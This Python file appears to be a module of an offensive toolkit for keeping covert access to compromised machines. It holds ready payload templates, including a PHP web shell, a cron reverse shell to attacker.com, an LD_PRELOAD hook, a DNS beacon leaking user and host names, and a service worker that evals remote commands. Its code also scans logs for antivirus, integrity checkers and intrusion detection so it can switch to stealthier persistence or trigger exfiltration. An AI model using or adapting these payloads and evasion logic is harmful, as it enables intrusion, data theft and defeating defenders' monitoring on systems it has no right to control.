"""
Tier 3: Adaptive Detection-Aware Persistence
Dynamically rotates persistence mechanisms based on detected security activity.
Includes web shells, cron jobs, environment variables, startup scripts, reverse shells, DNS beacons, memory residents, and service workers.
"""

import re
import time
import hashlib
from enum import Enum
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Callable
from datetime import datetime, timedelta


class PersistenceMethod(Enum):
    """Supported persistence mechanisms."""
    WEB_SHELL = "web_shell"
    CRON_JOB = "cron_job"
    ENV_VARIABLE = "env_variable"
    STARTUP_SCRIPT = "startup_script"
    REVERSE_SHELL = "reverse_shell"
    DNS_BEACON = "dns_beacon"
    MEMORY_RESIDENT = "memory_resident"
    SERVICE_WORKER = "service_worker"


@dataclass
class PersistenceHandle:
    """Encapsulates a persistence mechanism instance."""
    method: PersistenceMethod
    location: str
    payload: str
    installed_at: float
    last_verified: float = 0.0
    detection_risk: str = "low"  # low/medium/high
    active: bool = True
    metadata: Dict[str, Any] = field(default_factory=dict)


# Persistence payload templates
PERSISTENCE_PAYLOADS = {
    PersistenceMethod.WEB_SHELL: {
        "description": "PHP/ASP web shell for web-accessible persistence",
        "template": """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>""",
        "file_extensions": [".php", ".php5", ".asp", ".aspx", ".jsp"],
        "detection_risk": "high",
        "bypass_techniques": ["encoding", "polyglot", "obfuscation"]
    },
    
    PersistenceMethod.CRON_JOB: {
        "description": "Scheduled cron job for periodic execution",
        "template": "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
        "file_extensions": ["/etc/crontab", "/var/spool/cron/crontabs/"],
        "detection_risk": "medium",
        "bypass_techniques": ["hiding_in_system_crons", "base64_encoding"]
    },
    
    PersistenceMethod.ENV_VARIABLE: {
        "description": "Hidden code in environment variables",
        "template": "export LD_PRELOAD=/tmp/.lib.so",
        "file_extensions": [".bashrc", ".bash_profile", ".profile"],
        "detection_risk": "low",
        "bypass_techniques": ["obfuscation", "hiding_in_legitimate_vars"]
    },
    
    PersistenceMethod.STARTUP_SCRIPT: {
        "description": "System startup script execution",
        "template": """#!/bin/bash
# Legitimate service startup
/path/to/malicious/script.sh > /dev/null 2>&1 &
exit 0""",
        "file_extensions": ["/etc/init.d/", "/etc/systemd/system/", "/etc/rc.d/"],
        "detection_risk": "medium",
        "bypass_techniques": ["filename_spoofing", "permission_issues"]
    },
    
    PersistenceMethod.REVERSE_SHELL: {
        "description": "Reverse shell connection",
        "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "file_extensions": ["/dev/null", "memory"],
        "detection_risk": "high",
        "bypass_techniques": ["DNS_exfil", "HTTPS_tunnel", "DNS_over_HTTPS"]
    },
    
    PersistenceMethod.DNS_BEACON: {
        "description": "DNS-based command and control beacon",
        "template": """
while true; do
    nslookup $(whoami).$(hostname).{ATTACKER_DOMAIN}
    sleep 60
done
""",
        "file_extensions": ["memory", "/tmp/"],
        "detection_risk": "low",
        "bypass_techniques": ["slow_exfil", "dns_over_https"]
    },
    
    PersistenceMethod.MEMORY_RESIDENT: {
        "description": "In-memory resident malware (no disk artifacts)",
        "template": "injected_process_code",
        "file_extensions": ["memory"],
        "detection_risk": "low",
        "bypass_techniques": ["process_hollowing", "code_injection", "reflective_dll_injection"]
    },
    
    PersistenceMethod.SERVICE_WORKER: {
        "description": "Browser service worker for web-based persistence",
        "template": """self.addEventListener('install', event => {
    event.waitUntil(self.skipWaiting());
});
self.addEventListener('fetch', event => {
    fetch('https://attacker.com/command').then(r => r.json()).then(cmd => eval(cmd));
});""",
        "file_extensions": [".js", "service_worker.js"],
        "detection_risk": "medium",
        "bypass_techniques": ["code_obfuscation", "timing_variations"]
    }
}


class DetectionSignalProcessor:
    """Analyzes logs and system indicators for detection signals."""

    # Regex patterns to detect security activity
    DETECTION_PATTERNS = {
        "file_integrity_check": {
            "patterns": [
                r"aide\|",
                r"tripwire",
                r"samhain",
                r"ossec",
                r"file\s+integrity",
                r"checksum.*mismatch",
                r"changed:\s*\d+\s*file"
            ],
            "severity": "high"
        },
        
        "av_scan": {
            "patterns": [
                r"clamav|clamd",
                r"malwarebytes",
                r"avast|avg",
                r"norton|mcafee",
                r"scanning.*directory",
                r"threat.*detected",
                r"virus.*found"
            ],
            "severity": "critical"
        },
        
        "unusual_login": {
            "patterns": [
                r"sshd.*invalid.*user",
                r"failed.*password",
                r"authentication.*failure",
                r"sudo.*command.*not.*allowed",
                r"sudo.*user.*not.*in.*sudoers"
            ],
            "severity": "medium"
        },
        
        "privilege_escalation_attempt": {
            "patterns": [
                r"sudo.*attempt",
                r"selinux.*avc.*denied",
                r"apparmor.*denied",
                r"privilege.*escalation",
                r"access.*denied.*permission"
            ],
            "severity": "high"
        },
        
        "process_monitoring": {
            "patterns": [
                r"auditd",
                r"inotify",
                r"file.*monitor",
                r"process.*trace",
                r"strace.*execution",
                r"systemtap"
            ],
            "severity": "medium"
        },
        
        "network_monitoring": {
            "patterns": [
                r"tcpdump|wireshark",
                r"snort|suricata",
                r"netflow",
                r"intrusion.*detection",
                r"traffic.*analysis",
                r"connection.*monitoring"
            ],
            "severity": "high"
        },
        
        "admin_activity": {
            "patterns": [
                r"sudo\s+",
                r"whoami",
                r"id\s+",
                r"uname\s+-a",
                r"ps\s+aux",
                r"netstat|ss\s+",
                r"iptables|firewall",
                r"systemctl.*status"
            ],
            "severity": "low"
        }
    }

    def __init__(self):
        self.detected_signals: List[Dict[str, Any]] = []
        self.risk_level: str = "low"

    def analyze_signals(self, log_entries: List[str]) -> List[Dict[str, Any]]:
        """
        Analyze log entries for detection signals.
        
        Args:
            log_entries: List of log lines to analyze
            
        Returns:
            List of detected signals with metadata
        """
        signals = []
        
        for log_entry in log_entries:
            for signal_type, signal_config in self.DETECTION_PATTERNS.items():
                for pattern in signal_config['patterns']:
                    if re.search(pattern, log_entry, re.IGNORECASE):
                        signal = {
                            'type': signal_type,
                            'severity': signal_config['severity'],
                            'log_entry': log_entry,
                            'timestamp': time.time(),
                            'pattern_matched': pattern
                        }
                        signals.append(signal)
                        self.detected_signals.append(signal)
        
        return signals

    def calculate_risk_level(self, signals: List[Dict[str, Any]]) -> str:
        """
        Calculate overall risk level based on detected signals.
        
        Args:
            signals: List of detected signals
            
        Returns:
            Risk level: low/medium/high/critical
        """
        if not signals:
            return "low"
        
        # Count signals by severity
        severity_counts = {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0
        }
        
        for signal in signals:
            severity = signal.get('severity', 'low')
            if severity in severity_counts:
                severity_counts[severity] += 1
        
        # Calculate risk
        if severity_counts['critical'] > 0:
            self.risk_level = "critical"
        elif severity_counts['critical'] == 0 and severity_counts['high'] >= 2:
            self.risk_level = "high"
        elif severity_counts['medium'] >= 3:
            self.risk_level = "medium"
        else:
            self.risk_level = "low"
        
        return self.risk_level

    def get_signal_summary(self) -> Dict[str, Any]:
        """Get summary of detected signals."""
        return {
            'total_signals': len(self.detected_signals),
            'risk_level': self.risk_level,
            'signal_types': list(set(s['type'] for s in self.detected_signals)),
            'last_update': time.time()
        }


class AdaptivePersistenceManager:
    """Manages detection-aware persistence rotation."""

    def __init__(self):
        self.active_handles: Dict[str, PersistenceHandle] = {}
        self.signal_processor = DetectionSignalProcessor()
        self.rotation_history: List[Dict[str, Any]] = []

    def install_persistence(self, method: PersistenceMethod, target: str, **kwargs) -> PersistenceHandle:
        """
        Install persistence mechanism on target.
        
        Args:
            method: Persistence method to use
            target: Target location/system
            **kwargs: Method-specific parameters (credentials, paths, etc.)
            
        Returns:
            Handle to installed persistence mechanism
        """
        payload_template = PERSISTENCE_PAYLOADS[method]['template']
        
        # Substitute parameters in template
        for key, value in kwargs.items():
            payload_template = payload_template.replace(f"{{{key.upper()}}}", str(value))
        
        handle = PersistenceHandle(
            method=method,
            location=target,
            payload=payload_template,
            installed_at=time.time(),
            last_verified=time.time(),
            detection_risk=PERSISTENCE_PAYLOADS[method]['detection_risk'],
            metadata={
                'hostname': kwargs.get('hostname'),
                'username': kwargs.get('username'),
                'cwd': kwargs.get('cwd')
            }
        )
        
        handle_id = hashlib.md5(f"{method.value}_{target}_{time.time()}".encode()).hexdigest()[:12]
        self.active_handles[handle_id] = handle
        
        return handle

    def rotate_on_detection(self, signal: Dict[str, Any], current_handle: PersistenceHandle) -> PersistenceHandle:
        """
        Rotate to a different persistence method when detection is suspected.
        
        Args:
            signal: Detection signal that triggered rotation
            current_handle: Current persistence handle
            
        Returns:
            New persistence handle with different method
        """
        # Get rotation order from current method
        rotation_order = self.get_rotation_order(current_handle.method)
        
        # Find next available method
        new_method = None
        for method in rotation_order:
            if method != current_handle.method:
                new_method = method
                break
        
        if not new_method:
            new_method = rotation_order[0]
        
        # Install new persistence
        new_handle = self.install_persistence(
            new_method,
            current_handle.location,
            hostname=current_handle.metadata.get('hostname'),
            username=current_handle.metadata.get('username')
        )
        
        # Record rotation
        rotation_event = {
            'timestamp': time.time(),
            'old_method': current_handle.method.value,
            'new_method': new_method.value,
            'trigger_signal': signal['type'],
            'trigger_severity': signal['severity']
        }
        self.rotation_history.append(rotation_event)
        
        # Deactivate old handle
        current_handle.active = False
        
        return new_handle

    def verify_persistence(self, handle: PersistenceHandle) -> bool:
        """
        Verify if persistence mechanism is still active.
        
        Args:
            handle: Persistence handle to verify
            
        Returns:
            True if persistence is active, False otherwise
        """
        # Simulate verification - in real scenario would execute verification commands
        time_since_install = time.time() - handle.installed_at
        
        # Check if handle has degraded over time
        degradation_rate = 0.01  # 1% per hour
        time_hours = time_since_install / 3600
        survival_probability = 1.0 - (degradation_rate * time_hours)
        
        is_active = survival_probability > 0.5 and handle.active
        
        if is_active:
            handle.last_verified = time.time()
        
        return is_active

    def generate_observer_task(self, target: str) -> Dict[str, Any]:
        """
        Generate a Blackboard task for monitoring detection signals.
        
        Args:
            target: Target system to monitor
            
        Returns:
            Blackboard task configuration
        """
        task = {
            'task_id': hashlib.md5(f"observe_{target}_{time.time()}".encode()).hexdigest()[:12],
            'task_type': 'monitor_detection_signals',
            'target': target,
            'interval_seconds': 300,  # Every 5 minutes
            'monitoring_items': [
                'system_logs',
                'auth_logs',
                'process_list',
                'network_connections',
                'file_integrity',
                'security_alerts'
            ],
            'actions_on_detection': {
                'low_risk': 'continue_monitoring',
                'medium_risk': 'prepare_rotation',
                'high_risk': 'initiate_rotation',
                'critical_risk': 'emergency_exfiltration'
            },
            'created_at': time.time(),
            'status': 'active'
        }
        
        return task

    def get_rotation_order(self, current_method: PersistenceMethod) -> List[PersistenceMethod]:
        """
        Get the recommended rotation order for persistence methods.
        
        Args:
            current_method: Current persistence method
            
        Returns:
            List of methods in rotation order (least detectable first)
        """
        # Order by detection risk (low -> high)
        # DNS_BEACON and ENV_VARIABLE are hardest to detect
        # WEB_SHELL and REVERSE_SHELL are easiest to detect
        
        rotation_order = [
            PersistenceMethod.DNS_BEACON,
            PersistenceMethod.MEMORY_RESIDENT,
            PersistenceMethod.ENV_VARIABLE,
            PersistenceMethod.CRON_JOB,
            PersistenceMethod.STARTUP_SCRIPT,
            PersistenceMethod.SERVICE_WORKER,
            PersistenceMethod.WEB_SHELL,
            PersistenceMethod.REVERSE_SHELL
        ]
        
        # Move current method to end (least preferred)
        if current_method in rotation_order:
            rotation_order.remove(current_method)
            rotation_order.append(current_method)
        
        return rotation_order

    def get_persistence_status(self) -> Dict[str, Any]:
        """Get status of all active persistence mechanisms."""
        active_count = sum(1 for h in self.active_handles.values() if h.active)
        verified_count = sum(1 for h in self.active_handles.values() if self.verify_persistence(h))
        
        return {
            'total_handles': len(self.active_handles),
            'active_handles': active_count,
            'verified_handles': verified_count,
            'rotation_history_count': len(self.rotation_history),
            'current_risk_level': self.signal_processor.risk_level,
            'methods_in_use': list(set(h.method.value for h in self.active_handles.values() if h.active))
        }


class PersistenceOptimizer:
    """Optimizes persistence strategy based on environment."""

    def __init__(self):
        self.environment_profile: Dict[str, Any] = {}
        self.recommended_methods: List[PersistenceMethod] = []

    def profile_environment(self, system_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Profile the target environment to recommend best persistence methods.
        
        Args:
            system_info: System information gathered from reconnaissance
            
        Returns:
            Environment profile with recommendations
        """
        profile = {
            'os': system_info.get('os'),
            'has_web_server': system_info.get('has_web_server', False),
            'has_cron': system_info.get('has_cron', False),
            'av_detected': system_info.get('av_detected', False),
            'security_level': system_info.get('security_level', 'unknown'),
            'isolated_network': system_info.get('isolated_network', False),
            'recommended_methods': []
        }
        
        # Recommend methods based on environment
        if profile['has_web_server'] and not profile['av_detected']:
            profile['recommended_methods'].append(PersistenceMethod.WEB_SHELL)
        
        if profile['has_cron']:
            profile['recommended_methods'].append(PersistenceMethod.CRON_JOB)
        
        if not profile['av_detected']:
            profile['recommended_methods'].append(PersistenceMethod.ENV_VARIABLE)
        
        # DNS beacon is always good as fallback
        profile['recommended_methods'].append(PersistenceMethod.DNS_BEACON)
        
        self.environment_profile = profile
        self.recommended_methods = profile['recommended_methods']
        
        return profile


if __name__ == "__main__":
    # Example usage
    manager = AdaptivePersistenceManager()
    
    # Install initial persistence
    handle = manager.install_persistence(
        PersistenceMethod.CRON_JOB,
        "/var/spool/cron/crontabs/root",
        LHOST="attacker.com",
        LPORT="4444",
        hostname="target.local",
        username="root"
    )
    print(f"Installed {handle.method.value} persistence")
    
    # Simulate detection signal
    sample_logs = [
        "[2026-02-24 10:30] sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/apt-get",
        "[2026-02-24 10:31] clamav: Scanning directory /tmp",
        "[2026-02-24 10:32] aid: Filesystem integrity check initiated",
        "[2026-02-24 10:33] sshd[1234]: Invalid user attempt from 192.168.1.100"
    ]
    
    # Analyze signals
    signals = manager.signal_processor.analyze_signals(sample_logs)
    print(f"Detected {len(signals)} signals")
    
    # Calculate risk
    risk = manager.signal_processor.calculate_risk_level(signals)
    print(f"Risk level: {risk}")
    
    # Rotate persistence if needed
    if risk in ['high', 'critical'] and signals:
        new_handle = manager.rotate_on_detection(signals[0], handle)
        print(f"Rotated to {new_handle.method.value} persistence")
    
    # Check status
    status = manager.get_persistence_status()
    print(f"Persistence status: {status}")
    
    # Profile environment
    optimizer = PersistenceOptimizer()
    env_profile = optimizer.profile_environment({
        'os': 'Linux',
        'has_web_server': True,
        'has_cron': True,
        'av_detected': False,
        'security_level': 'medium'
    })
    print(f"Recommended methods: {[m.value for m in env_profile['recommended_methods']]}")
